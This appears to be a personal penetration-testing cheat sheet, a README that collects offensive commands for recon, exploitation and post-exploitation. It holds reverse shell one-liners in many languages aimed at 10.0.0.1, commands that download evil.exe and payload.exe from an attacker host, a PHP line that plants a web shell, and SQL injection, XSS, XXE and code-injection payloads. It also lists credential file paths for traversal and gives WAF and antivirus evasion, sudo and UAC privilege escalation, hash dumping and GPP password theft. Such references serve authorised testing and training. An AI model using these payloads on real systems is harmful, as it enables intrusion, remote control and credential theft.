# cheatsheetz
various cheatsheets on security and such

## other branches
[shellcoding-32](shellcoding-32.md)

## recon 
```
# quick discovey on network
netdiscover

# enumeration scan
nmap -p 1-65535 -sV -sS -A -T4 $ip/24 -oN nmap.txt

# enumeration scan TCP/UDP, output to file
nmap -oN nmap2.txt -v -sU -sS -p- -A -T4 $ip

# all TCP/UDP ports
nmap -v -sU -sS -p- -A -T4 $ip

# scan with active connect to avoid fake ports
nmap -p1-65535 -A -T5 -sT $ip

# web scanner
nikto -h http://192.168.56.101/

# dir scan using various tools
gobuster -w /usr/share/dirb/wordlists/big.txt -u http://192.168.56.101:31337/ -r -t 40
dirb http://192.168.56.101/ ~/directory-list-2.3-small.txt -w
```

## reverse shells (thanks to pentest monkey for most of it)
```
# bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

# perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

# ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# netcat
nc -e /bin/sh 10.0.0.1 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f


# java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

# groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## generic file transfers
```
# if you have meterpreter shell, you can upload/download files using it
meterpreter> upload /usr/share/windows-binaries/nc.exe c:\\nc.exe
meterpreter> download  c:\\nc.exe /usr/share/windows-binaries/nc.exe
```

## windows file transfers

```
# tftp
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /usr/share/windows-binaries/nc.exe /tftp/
# On Windows
C:\Users\Offsec>tftp -i $ip get nc.exe

# ftp
apt-get update && apt-get install pure-ftpd

#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd offsec -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart

# On Windows
echo open ATTACKER_IP 21 > ftp.txt
echo USERNAME >> ftp.txt
echo PASSWORD >> ftp.txt
echo bin >> ftp.txt
echo GET evil.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt

# VBScript
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

# On Windows Host then...
cscript wget.vbs http://ATTACKER_IP/evil.exe evil.exe

# PowerShell
powershell.exe -Command "& { Invoke-WebRequest 'http://10.10.15.207:8888/payload.exe' -OutFile 'payload.exe'}"
```

## linux file transfers
```
# wget
# curl
# nc DESTINATION_IP 1234 < file.exe
# echo open 192.168.0.1 >> ftp &echo user USER PASSWORD >> ftp &echo binary >> ftp &echo get file.zip >> ftp &echo bye >> ftp &ftp -n -v -s:ftp &del ftp
# scp
```

## save file using php
```
<?php passthru("wget 10.10.15.160:8888/php.txt -O /var/tmp/shell.php")?>
```

## vulnerable functions in various languages
```
# remember to encode
php eval()
http://site/?name=hacker
http://site/?name=".system('uname -a'); $dummy="
http://site/?name=".system('uname -a');//
php usort()
http://site/?order=age
http://site/?order=id);}system('/usr/local/bin/exploit');//
php preg_replace()
http://site/?new=hacker&pattern=/lamer/&base=Hello lamer
http://site/?new=phpinfo()&pattern=/lamer/e&base=Hello lamer
php assert()
http://site/?name=hacker'.system("/usr/local/bin/exploit").'
ruby eval()
http://site/?username="+`whoami`+"
http://site/?username="+`/usr/local/bin/exploit`+"
python()
# test if it's Python
http://site/hello/"+str(True)+"test
http://site/hello/"+str(os.system('id'))+"test
"+str(__import__('os').system('/usr/local/bin/exploit'))+"
```

## command injection
```
# use ; | || && 
`command`
$( command )
```

# path traversal cheatsheets
```
# linux
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
..././
...\.\
/etc/passwd
/etc/shadow
/etc/aliases
/etc/anacrontab
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/etc/bashrc
/etc/cron.allow
/etc/cron.deny
/etc/crontab
/etc/cups/cupsd.conf
/etc/exports
/etc/fstab
/etc/groups
/etc/hosts
/etc/hosts.allow
/etc/hosts.deny
/etc/httpd/access.conf
/etc/httpd/conf/httpd.conf
/etc/httpd/httpd.conf
/etc/my.cnf
/etc/my.conf
/etc/mysql/my.cnf
/etc/passwd
/etc/resolv.conf
/etc/samba/smb.conf
/etc/snmpd.conf
/var/apache2/config.inc
/var/cpanel/cpanel.config
/var/lib/mysql/my.cnf
/var/lib/mysql/mysql/user.MYD
/var/local/www/conf/php.ini
/var/log/apache2/access_log
/var/log/apache2/access.log
/var/log/apache2/error_log
/var/log/apache2/error.log
/var/log/apache/access_log
/var/log/apache/access.log
/var/log/apache/error_log
/var/log/apache/error.log
~/.bash_history
~/.bash_profile
~/.bashrc
~/.login
~/.mysql_history
~/.nano_history
~/.profile
~/.ssh/authorized_keys
~/.ssh/id_dsa
~/.ssh/id_rsa
```

## lfi/rfi
```
%00 (NULL Byte) LFI to end string
#for RFI add at the end some argument
http://site/?page=https://bad.com/test_include_system.txt?&c=/usr/local/bin/exploit?&c=haha
```

# xxe
```
## read /etc/passwd
xml=%3C%21DOCTYPE%20test%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2f%2f%2fetc%2fpasswd%22%3E%5D%3E%3Ctest%3E%26xxe%3B%3C%2ftest%3E
```


## sql injection 101
```
admin' or '1'='1--
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1--
' OR 1=1 # (space!!!)
' OR 1=1 LIMIT 1 # 
# avoid spaces
root'/**/or/**/1=1#'
```

## xss tricks
```
<sCript>...</sCript>
<sc<script>ript>...</sc</script>ript>
http://site/index.php?name=<img src='zzzz' onerror='alert("1")' />
# javascript eval
http://site/index.php?name=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,48,55,56,51,51,49,56,97,45,101,97,52,48,45,52,100,100,102,45,97,57,52,49,45,53,99,100,51,56,53,48,53,101,51,48,56,39,41))</script>
# php_self
http://site/example.php/"><script>alert('xss')</script>
# anchor
http://site/index.php#<script>alert('xss')</script>
```

## generate passwords
```
# generate passwords given min max length using specified characters
root@expl0it:~# crunch 4 4 ad12 | head -n10
Crunch will now generate the following amount of data: 1280 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 256
aaaa
aaad
aaa1
aaa2
aada
aadd
aad1
aad2
aa1a
aa1d
...
```

# spawn full tty
```
python -c "import pty; pty.spawn('/bin/bash')"
# then press ctrl-z
# type "stty raw -echo" (in your terminal)
# type "fg" to bring netcat back
```

# decompile/view APKs
```
apktool/ByteCodeViewer
```

## snmp walking
```
braa
```

## fuzz parameters
```
wfuzz -c -z file,/root/dictionaries/params.txt  --hc 302 http://10.10.10.1:1234/panel.php?info=FUZZ
```

## smtp enumeration
```
# using msfconsole
msf auxiliary(smtp_enum) > use auxiliary/scanner/smtp/smtp_enum
msf auxiliary(smtp_enum) > set RHOSTS 192.168.56.101
msf auxiliary(smtp_enum) > run
```

## cracking private ssh key using john the ripper and wordlist
```
root@blackbox:~# ssh2john id_rsa > crackme
root@blackbox:~# zcat /usr/share/wordlists/rockyou.txt.gz | john --pipe --rules crackme
```

## enumerating database with sqlmap
```
# check if there's even a vulnerability
sqlmap -u "https://admin-portal.vulnerable.site/login.php" --data="email=admin@vulnerable.site&password=password"
# check existing databases
sqlmap -u "https://admin-portal.vulnerable.site/login.php" --data="email=admin%40vulnerable.site&password=password" --dbs
# check tables in admin database
sqlmap -u "https://admin-portal.vulnerable.site/login.php" --data="email=admin%40vulnerable.site&password=password" -D admin --tables
# check columns in users table
sqlmap -u "https://admin-portal.vulnerable.site/login.php" --data="email=admin%40vulnerable.site&password=password" -D admin -T users --columns
# dump values in that table
sqlmap -u "https://admin-portal.vulnerable.site/login.php" --data="email=admin%40vulnerable.site&password=password" -D admin -T users C email,username,password --dump
```

## waf evasion
```
Standard: /bin/nc 127.0.0.1 1337 
Evasion:/???/n? 2130706433 1337 
Used chars: / ? n [0-9]

Standard: /bin/cat /etc/passwd
Evasion: /???/??t /???/??ss??
Used chars: / ? t s
Enumerate with echo

echo /*/*ss*
```

## basic linux tools and privilege escalation, if you can execute any of them as sudo
```
sudo find / -exec /bin/sh -I \;
sudo vi // inside :shell
sudo more/less // inside :bash
sudo python -c "import pty; pty.spawn("bin/bash")"
sudo perl -e 'exec "/bin/sh"'
sudo ruby -e 'exec "/bin/sh"'
sudo ftp // inside !/bin/sh
sudo gdb // inside !/bin/sh
sudo scp -S /tmp/out.sh x y;
nmap -interactive
nmap> !sh
# also for chkrootkit, if /tmp has suid exec perms
echo "chown root:root /bin/sh; chmod 4777 /bin/sh" > /tmp/update
chmod +x /tmp/update
# wait for chkrootkit to be executed…
```

## extract metadata from multiple data formats
```
exiftool / foca
```

## escaping restricted shell
```
# first enumerate
env, echo $PATH, try basic commands
# quick wins
/bin/sh, cp /bin/sh $DIR_FROM_PATH
# standard tools shells
vi, more, less, python, ...
# use ssh to execute shell before environment is loaded
ssh user@host -t "/bin/sh"
ssh user@host -t "bash --noprofile"
# try shellshock 
ssh user@host -t " ()  { :; }; /bin/bash "
# write to file using tee
echo "give me shell" | tee script.sh
```

# evading avs
```
veil / hyperion
```

# fuzzing binary to make it uncrackable (it won't open in radare2/gdb)
```
# flip random bytes (magic bytes)
```

## bypass uac
```
meterpreter> background
msf> use windows/local/bypssuac
msf> set SESSION 1
msf> set PAYLOAD windows/meterpreter/reverse_tcp
msf> set LHOST
msf> set LPORT 
msf> run
...
meterpreter> getprivs
meterpreter> ps
meterpreter> migrate (process with SYSTEM)
meterpreter> hashdump
```

## avoiding avs
```
# encoding does like nothing, but you can embed shellcode into PE that is not malicious
# use hyperion
# use veil
```

## crack basic http auth with medusa
```
medusa -h admin.megacorpone.com -u admin -P mega-mangled -M http -n 81 -m DIR:/admin -T 30
```

## create reverse proxy using socat (useful when you have vpn on headless kali and want to look for bugs in your main os browser
```
socat TCP-LISTEN:8001,fork TCP:10.10.10.80:80
```

## check what type of hash is that
```
hash-identifier
```

## post exploitation in domain
```
meterpreter> background
msf> use post/windows/gather/enum_domain
msf> set SESSION 1
...found DC & IP...
msf> sessions -i 1
meterpreter> shell
shell> net use z: \\dc01\SYSVOL
shell> dir /s groups.xml
shell> cp . Downloads
# decrypt passsword with gpp-decrypyt PASSWORD
```

## attacking oracle padding
```
padbuster http://lazy/login.php NAlGGs3bfOJ39x0820d8KeKXMyDPAxsc 8 -cookies auth=NAlGGs3bfOJ39x0820d8KeKXMyDPAxsc -plaintext user=admin

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 200
[+] Location: N/A
[+] Content Length: 1486

INFO: Starting PadBuster Encrypt Mode
[+] Number of Blocks: 2

INFO: No error string was provided...starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------
ID#     Freq    Status  Length  Location
-------------------------------------------------------
1       1       200     1564    N/A
2 **    255     200     15      N/A
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2

Continuing test with selection 2

[+] Success: (196/256) [Byte 8]
[+] Success: (148/256) [Byte 7]
[+] Success: (92/256) [Byte 6]
[+] Success: (41/256) [Byte 5]
[+] Success: (218/256) [Byte 4]
[+] Success: (136/256) [Byte 3]
```
